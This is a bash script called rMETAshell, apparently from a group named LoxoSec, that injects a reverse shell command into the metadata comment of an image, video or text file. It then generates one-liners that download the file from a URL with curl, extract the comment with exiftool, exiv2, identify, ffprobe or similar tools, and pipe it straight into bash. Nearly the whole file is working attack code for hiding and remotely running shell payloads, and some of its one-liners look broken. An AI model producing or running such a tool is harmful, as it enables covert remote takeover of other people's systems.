#!/bin/bash
#
# rMETAshell - A reverse shell metadata injection
# and one-liner generator tool!
# 
# From: LoxoSec with ❤️
# git5
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
# ------------------------------------------------
# X
# https://x.com/git5loxosec
# ------------------------------------------------

show_help() {
    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename>"
    echo "Inject a reverse shell command into an image and generate a one-liner execution method."
    echo ""
    echo "Options:"
    echo "  -h, --help           Display this help message."
    echo ""
    echo "Arguments:"
    echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
    echo "  <filename>     The name of the image file."
    echo ""
}

if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    show_help
    exit 0
fi

if [ $# -ne 2 ]; then
    echo "Error: Invalid number of arguments."
    show_help
    exit 1
fi

command="$1"
filename="$2"

exiftool -Comment="$command" "$filename"

echo "Command injection completed."

read -p "Enter the URL path to the image file (e.g., http://www.example.com/): " url

echo "Execution methods compatible with image file format."
echo "1. image-exiftool-one-liner"
echo "2. image-exiv2-one-liner"
echo "3. image-identify-one-liner"
echo "4. image-file-grep-one-liner"
echo "5. image-jpeginfo-grep-one-liner"
echo "6. image-exiftool-zip"

echo "Execution method compatible with video file format."
echo "7. video-exiftool-one-liner"
echo "8. video-mediainfo-one-liner"
echo "9. video-ffprobe-one-liner"
echo "10. video-exiftool-zip"

echo "Execution method compatible with text file format."
echo "11. text-sed-one-liner"
echo "12. text-exiftool-zip"
read -p "Enter the method number (1-12): " method_choice

case "$method_choice" in
    1)
        echo -e "\e[34mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    2)
        echo -e "\e[34mGenerating one-liner method with exiv2..."
        one_liner="curl -s '$url/$filename' | exiv2 -p c | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    3)
        echo -e "\e[34mGenerating one-liner method with identify..."
        one_liner="curl -s '$url/$filename' | identify -format '%c' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    4)
        echo -e "\e[34mGenerating one-liner method with file and grep..."
        one_liner="curl -s '$url/$filename' | file - | grep -o 'comment: \".*\"' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    5)
        echo -e "\e[34mGenerating one-liner method with jpeginfo and grep..."
        one_liner="curl -s '$url/$filename' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    6)
        echo -e "\e[34mGenerating one-liner method with exiftool, image/video through zip..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    7)
        echo -e "\e[34mGenerating one-liner method with exiftool..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    8)
        echo -e "\e[34mGenerating one-liner method with mediainfo..."
        one_liner="curl -s '$url/$filename' | mediainfo --Output="General;%Comment%" | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    9)
        echo -e "\e[34mGenerating one-liner method with ffprobe..."
        one_liner="curl -s '$url/$filename' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    10)
        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    11)
        echo -e "\e[34mGenerating one-liner method with sed..."
        one_liner="curl -s '$url/$filename' | sed 's/<rs>//g' | sed 's/</rs>//' | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    12)
        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
        one_liner="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        echo "Generated one-liner:"
        echo -e "$one_liner\e[0m"
        ;;
    *)
        echo "Invalid method choice."
        ;;
esac
